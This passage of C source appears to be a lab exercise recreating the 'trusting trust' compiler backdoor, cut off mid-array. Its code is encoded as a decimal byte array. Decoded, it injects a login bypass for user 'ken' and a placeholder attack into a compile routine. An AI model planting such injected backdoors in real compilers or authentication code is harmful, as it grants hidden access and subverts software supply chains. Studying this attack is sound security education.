char prog[] = {
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	91, 	93, 	32,
	61, 	32, 	34, 	105, 	110, 	116, 	32, 	108,
	111, 	103, 	105, 	110, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	117, 	115, 	101, 	114, 	41,
	32, 	123, 	34, 	59, 	10, 	10, 	10, 	47,
	47, 	32, 	97, 	110, 	100, 	32, 	105, 	110,
	106, 	101, 	99, 	116, 	32, 	97, 	110, 	32,
	97, 	116, 	116, 	97, 	99, 	107, 	32, 	102,
	111, 	114, 	32, 	34, 	107, 	101, 	110, 	34,
	58, 	10, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	99, 	104, 	97, 	114, 	32, 	108, 	111,
	103, 	105, 	110, 	95, 	97, 	116, 	116, 	97,
	99, 	107, 	91, 	93, 	32, 	61, 	32, 	34,
	105, 	102, 	40, 	115, 	116, 	114, 	99, 	109,
	112, 	40, 	117, 	115, 	101, 	114, 	44, 	32,
	92, 	34, 	107, 	101, 	110, 	92, 	34, 	41,
	32, 	61, 	61, 	32, 	48, 	41, 	32, 	114,
	101, 	116, 	117, 	114, 	110, 	32, 	49, 	59,
	34, 	59, 	10, 	47, 	47, 	32, 	99, 	104,
	97, 	114, 	42, 	32, 	109, 	111, 	100, 	105,
	102, 	105, 	101, 	100, 	95, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	61, 	32, 	109,
	97, 	108, 	108, 	111, 	99, 	40, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	41, 	32, 	43, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	32, 	43, 	32, 	49,
	41, 	59, 	10, 	10, 	47, 	47, 	32, 	105,
	110, 	116, 	32, 	105, 	32, 	61, 	32, 	48,
	59, 	10, 	47, 	47, 	32, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	105, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	41, 	41,
	123, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	105, 	102, 	32, 	40, 	115, 	116, 	114,
	110, 	99, 	109, 	112, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	44, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	41, 	41, 	32,
	61, 	61, 	32, 	48, 	41, 	123, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	47, 	47, 	32, 	115, 	116, 	114,
	110, 	99, 	112, 	121, 	40, 	109, 	111, 	100,
	105, 	102, 	105, 	101, 	100, 	95, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	44, 	32,
	105, 	32, 	43, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	41, 	41, 	59, 	10,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	47, 	47, 	32, 	115, 	116,
	114, 	99, 	97, 	116, 	40, 	109, 	111, 	100,
	105, 	102, 	105, 	101, 	100, 	95, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	59, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	47, 	47, 	32, 	115, 	116, 	114, 	99,
	97, 	116, 	40, 	109, 	111, 	100, 	105, 	102,
	105, 	101, 	100, 	95, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	32, 	43, 	32, 	115, 	116, 	114, 	108, 	101,
	110, 	40, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	41, 	41, 	59, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	110, 	116, 	32, 	106, 	32, 	61, 	32, 	105,
	59, 	32, 	106, 	32, 	60, 	32, 	105, 	32,
	43, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	59, 	32, 	106, 	43, 	43,
	41, 	123, 	10, 	47, 	47, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	37,
	99, 	34, 	44, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	91, 	106, 	93, 	41, 	59,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	125, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	105, 	32, 	43, 	61, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	41, 	59,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	111, 	114, 	32,
	40, 	105, 	110, 	116, 	32, 	106, 	32, 	61,
	32, 	48, 	59, 	32, 	106, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	59, 	32, 	106, 	43,
	43, 	41, 	123, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	102, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	102, 	112, 	44, 	32, 	34,
	37, 	99, 	34, 	44, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	91, 	106, 	93, 	41, 	59, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	125, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	92, 	110, 	34, 	41,
	59, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	125, 	32, 	101, 	108, 	115, 	101, 	32,
	123, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	99, 	34, 	44, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	91, 	105,
	93, 	41, 	59, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	125, 	10, 	47, 	47, 	32,
	32, 	32, 	32, 	32, 	105, 	43, 	43, 	59,
	10, 	47, 	47, 	32, 	125, 	10, 	10, 	10,
	47, 	47, 	32, 	105, 	110, 	116, 	32, 	105,
	32, 	61, 	32, 	48, 	59, 	10, 	47, 	47,
	32, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	101, 	110, 	100, 	91, 	93,
	32, 	61, 	32, 	34, 	100, 	111, 	101, 	115,
	32, 	110, 	111, 	116, 	32, 	101, 	120, 	105,
	115, 	116, 	92, 	92, 	110, 	92, 	34, 	44,
	32, 	117, 	115, 	101, 	114, 	41, 	59, 	34,
	59, 	10, 	47, 	47, 	32, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	105, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	41, 	41,
	123, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	105, 	102, 	32, 	40, 	115, 	116, 	114,
	110, 	99, 	109, 	112, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	44, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	41, 	41, 	32,
	61, 	61, 	32, 	48, 	41, 	123, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	47, 	47, 	32, 	115, 	116, 	114,
	110, 	99, 	112, 	121, 	40, 	109, 	111, 	100,
	105, 	102, 	105, 	101, 	100, 	95, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	44, 	32,
	105, 	32, 	43, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	41, 	41, 	59, 	10,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	47, 	47, 	32, 	115, 	116,
	114, 	99, 	97, 	116, 	40, 	109, 	111, 	100,
	105, 	102, 	105, 	101, 	100, 	95, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	59, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	47, 	47, 	32, 	115, 	116, 	114, 	99,
	97, 	116, 	40, 	109, 	111, 	100, 	105, 	102,
	105, 	101, 	100, 	95, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	32, 	43, 	32, 	115, 	116, 	114, 	108, 	101,
	110, 	40, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	41, 	41, 	59, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	110, 	116, 	32, 	106, 	32, 	61, 	32, 	105,
	59, 	32, 	106, 	32, 	60, 	32, 	105, 	32,
	43, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	59, 	32, 	106, 	43, 	43,
	41, 	123, 	10, 	47, 	47, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	102, 	112, 	44, 	32, 	34, 	37,
	99, 	34, 	44, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	91, 	106, 	93, 	41, 	59,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	125, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	105, 	32, 	43, 	61, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	41, 	59,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	111, 	114, 	32,
	40, 	105, 	110, 	116, 	32, 	106, 	32, 	61,
	32, 	48, 	59, 	32, 	106, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	41, 	59, 	32, 	106, 	43,
	43, 	41, 	123, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	102, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	102, 	112, 	44, 	32, 	34,
	37, 	99, 	34, 	44, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	91, 	106, 	93, 	41, 	59, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	125, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	92, 	110, 	34, 	41,
	59, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	105, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	41, 	41,
	123, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	105, 	102, 	32, 	40, 	115, 	116, 	114,
	110, 	99, 	109, 	112, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	101, 	110, 	100, 	44, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	108, 	111, 	103, 	105,
	110, 	95, 	101, 	110, 	100, 	41, 	41, 	32,
	61, 	61, 	32, 	48, 	41, 	123, 	10, 	47,
	47, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	105, 	32, 	43, 	61, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	108, 	111,
	103, 	105, 	110, 	95, 	101, 	110, 	100, 	41,
	59, 	10, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	115, 	34, 	44, 	32, 	34,
	92, 	110, 	34, 	41, 	59, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	98, 	114, 	101, 	97, 	107, 	59, 	10,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	125,
	32, 	101, 	108, 	115, 	101, 	32, 	123, 	10,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	105, 	43, 	43, 	59, 	10,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	125,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	125, 	10, 	47, 	47,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	37, 	115,
	34, 	44, 	32, 	34, 	114, 	101, 	116, 	117,
	114, 	110, 	32, 	49, 	59, 	34, 	41, 	59,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	125, 	32, 	101, 	108, 	115, 	101, 	32, 	123,
	10, 	47, 	47, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	99, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	91, 	105, 	93,
	41, 	59, 	10, 	47, 	47, 	32, 	32, 	32,
	32, 	32, 	125, 	10, 	47, 	47, 	32, 	32,
	32, 	32, 	32, 	105, 	43, 	43, 	59, 	10,
	47, 	47, 	32, 	125, 	10, 	10, 	10, 	32,
	32, 	32, 	32, 	10, 	10, 	47, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	42,
	42, 	42, 	42, 	42, 	42, 	42, 	42, 	10,
	32, 	42, 	32, 	83, 	116, 	101, 	112, 	32,
	50, 	58, 	10, 	32, 	42, 	47, 	10, 	10,
	47, 	47, 	32, 	115, 	101, 	97, 	114, 	99,
	104, 	32, 	102, 	111, 	114, 	32, 	116, 	104,
	101, 	32, 	115, 	116, 	97, 	114, 	116, 	32,
	111, 	102, 	32, 	116, 	104, 	101, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	32, 	114,
	111, 	117, 	116, 	105, 	110, 	101, 	58, 	32,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	34, 	115, 	116,
	97, 	116, 	105, 	99, 	32, 	118, 	111, 	105,
	100, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	40, 	99, 	104, 	97, 	114, 	32, 	42,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	44,
	32, 	99, 	104, 	97, 	114, 	32, 	42, 	111,
	117, 	116, 	110, 	97, 	109, 	101, 	41, 	32,
	123, 	92, 	110, 	34, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	34, 	32, 	32,
	32, 	32, 	70, 	73, 	76, 	69, 	32, 	42,
	102, 	112, 	32, 	61, 	32, 	102, 	111, 	112,
	101, 	110, 	40, 	92, 	34, 	46, 	47, 	116,
	101, 	109, 	112, 	45, 	111, 	117, 	116, 	46,
	99, 	92, 	34, 	44, 	32, 	92, 	34, 	119,
	92, 	34, 	41, 	59, 	92, 	110, 	34, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	34, 	32, 	32, 	32, 	32, 	97, 	115, 	115,
	101, 	114, 	116, 	40, 	102, 	112, 	41, 	59,
	34, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	59, 	10, 	10, 	47, 	47, 	32,
	97, 	110, 	100, 	32, 	105, 	110, 	106, 	101,
	99, 	116, 	32, 	97, 	32, 	112, 	108, 	97,
	99, 	101, 	104, 	111, 	108, 	100, 	101, 	114,
	32, 	34, 	97, 	116, 	116, 	97, 	99, 	107,
	34, 	58, 	10, 	47, 	47, 	32, 	105, 	110,
	106, 	101, 	99, 	116, 	32, 	116, 	104, 	105,
	115, 	32, 	97, 	102, 	116, 	101, 	114, 	32,
	116, 	104, 	101, 	32, 	97, 	115, 	115, 	101,
	114, 	116, 	32, 	97, 	98, 	111, 	118, 	101,
	32, 	97, 	102, 	116, 	101, 	114, 	32, 	116,
	104, 	101, 	32, 	99, 	97, 	108, 	108, 	32,
	116, 	111, 	32, 	102, 	111, 	112, 	101, 	110,
	46, 	10, 	47, 	47, 	32, 	110, 	111, 	116,
	32, 	109, 	117, 	99, 	104, 	32, 	111, 	102,
	32, 	97, 	110, 	32, 	97, 	116, 	116, 	97,
	99, 	107, 	46, 	32, 	32, 	32, 	116, 	104,
	105, 	115, 	32, 	105, 	115, 	32, 	106, 	117,
	115, 	116, 	32, 	97, 	32, 	113, 	117, 	105,
	99, 	107, 	32, 	112, 	108, 	97, 	99, 	101,
	104, 	111, 	108, 	100, 	101, 	114, 	46, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	97, 	116, 	116, 	97,
	99, 	107, 	91, 	93, 	32, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	61, 	32, 	34, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	92, 	34, 	37, 	115,
	58, 	32, 	99, 	111, 	117, 	108, 	100, 	32,
	104, 	97, 	118, 	101, 	32, 	114, 	117, 	110,
	32, 	121, 	111, 	117, 	114, 	32, 	97, 	116,
	116, 	97, 	99, 	107, 	32, 	104, 	101, 	114,
	101, 	33, 	33, 	92, 	92, 	110, 	92, 	34,
	44, 	32, 	95, 	95, 	70, 	85, 	78, 	67,
	84, 	73, 	79, 	78, 	95, 	95, 	41, 	59,
	34, 	59, 	10, 	10, 	105, 	110, 	116, 	32,
	105, 	32, 	61, 	32, 	48, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	101, 	110, 	100, 	91, 	93,
	32, 	61, 	32, 	34, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	41, 	59, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	101, 	110, 	100, 	91, 	93, 	32,
	61, 	32, 	34, 	100, 	111, 	101, 	115, 	32,
	110, 	111, 	116, 	32, 	101, 	120, 	105, 	115,
	116, 	92, 	92, 	110, 	92, 	34, 	44, 	32,
	117, 	115, 	101, 	114, 	41, 	59, 	34, 	59,
	10, 	119, 	104, 	105, 	108, 	101, 	32, 	40,
	105, 	32, 	60, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	41, 	41, 	123, 	10, 	32, 	32,
	32, 	32, 	105, 	102, 	32, 	40, 	115, 	116,
	114, 	110, 	99, 	109, 	112, 	40, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	32, 	43, 	32,
	105, 	44, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	44, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	41, 	41,
	32, 	61, 	61, 	32, 	48, 	41, 	123, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	47, 	47, 	32, 	115, 	116, 	114, 	110, 	99,
	112, 	121, 	40, 	109, 	111, 	100, 	105, 	102,
	105, 	101, 	100, 	95, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	44, 	32, 	105, 	32,
	43, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	47, 	47,
	32, 	115, 	116, 	114, 	99, 	97, 	116, 	40,
	109, 	111, 	100, 	105, 	102, 	105, 	101, 	100,
	95, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	97, 	116, 	116, 	97, 	99, 	107, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	47, 	47, 	32, 	115, 	116, 	114, 	99,
	97, 	116, 	40, 	109, 	111, 	100, 	105, 	102,
	105, 	101, 	100, 	95, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	32, 	43, 	32, 	105,
	32, 	43, 	32, 	115, 	116, 	114, 	108, 	101,
	110, 	40, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	41, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	102,
	111, 	114, 	32, 	40, 	105, 	110, 	116, 	32,
	106, 	32, 	61, 	32, 	105, 	59, 	32, 	106,
	32, 	60, 	32, 	105, 	32, 	43, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	108, 	111,
	103, 	105, 	110, 	95, 	115, 	105, 	103, 	41,
	59, 	32, 	106, 	43, 	43, 	41, 	123, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	99, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	91, 	106, 	93,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	125, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	105, 	32, 	43,
	61, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	111, 	114,
	32, 	40, 	105, 	110, 	116, 	32, 	106, 	32,
	61, 	32, 	48, 	59, 	32, 	106, 	32, 	60,
	32, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
	108, 	111, 	103, 	105, 	110, 	95, 	97, 	116,
	116, 	97, 	99, 	107, 	41, 	59, 	32, 	106,
	43, 	43, 	41, 	123, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	37, 	99,
	34, 	44, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	97, 	116, 	116, 	97, 	99, 	107, 	91,
	106, 	93, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	125, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	102,
	112, 	44, 	32, 	34, 	92, 	110, 	34, 	41,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	119, 	104, 	105, 	108, 	101, 	32,
	40, 	105, 	32, 	60, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	41, 	41, 	123, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	105, 	102, 	32, 	40, 	115,
	116, 	114, 	110, 	99, 	109, 	112, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	32, 	43,
	32, 	105, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	101, 	110, 	100, 	44, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	108, 	111,
	103, 	105, 	110, 	95, 	101, 	110, 	100, 	41,
	41, 	32, 	61, 	61, 	32, 	48, 	41, 	123,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	105, 	32, 	43, 	61, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	108, 	111, 	103,
	105, 	110, 	95, 	101, 	110, 	100, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	37, 	115,
	34, 	44, 	32, 	34, 	92, 	110, 	34, 	41,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	98, 	114, 	101, 	97, 	107, 	59,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	105, 	43,
	43, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	125,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	125, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	34, 	114, 	101, 	116, 	117, 	114,
	110, 	32, 	49, 	59, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	125, 	32, 	101, 	108,
	115, 	101, 	32, 	105, 	102, 	32, 	40, 	115,
	116, 	114, 	110, 	99, 	109, 	112, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	32, 	43,
	32, 	105, 	44, 	32, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	44,
	32, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
